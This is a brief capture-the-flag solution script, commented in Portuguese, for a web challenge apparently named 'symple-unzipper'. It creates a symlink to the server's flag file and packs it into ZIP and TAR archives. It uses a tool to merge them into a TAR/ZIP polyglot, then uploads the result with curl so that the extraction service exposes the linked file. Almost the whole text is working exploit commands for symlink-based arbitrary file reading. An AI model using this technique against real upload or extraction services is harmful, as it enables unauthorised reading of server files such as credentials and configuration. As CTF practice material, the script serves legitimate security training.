curl -X 'POST' \
  'http://symple-unzipper.web.jctf.pro/extract' \
  -H 'accept: application/json' \
  -H 'Content-Type: multipart/form-data' \
  -F 'file=@a.zip;type=application/zip'

# Criação do symlink e dos archives (ZIP e TAR)
ln -s /server/flag.txt flag.lnk

zip --symlinks a.zip flag.lnk
tar --owner=root --group=root --create --file give_me_flag.tar flag.lnk

# Criação do arquivo poliglota
/opt/tools/mitra/mitra.py give_me_flag.tar a.zip

# Esse também não vai (tar puro)
curl -X 'POST' \
  'http://localhost/extract' \
  -H 'accept: application/json' \
  -H 'Content-Type: multipart/form-data' \
  -F 'file=@give_me_flag.tar;type=application/tar'

# Vale renomear o arquivo gerado
ls S* P*
# 'P(200-400)-TAR[Zip].b85e2944.tar.zip'  'S(2800)-TAR-Zip.cc1382b4.zip.tar'

mv S\(2800\)-TAR-Zip.cc1382b4.zip.tar hackit.tar

# Partiu Flag
curl -X 'POST' \
  'http://symple-unzipper.web.jctf.pro/extract' \
  -H 'accept: application/json' \
  -H 'Content-Type: multipart/form-data' \
  -F 'file=@hackit.tar;type=application/tar'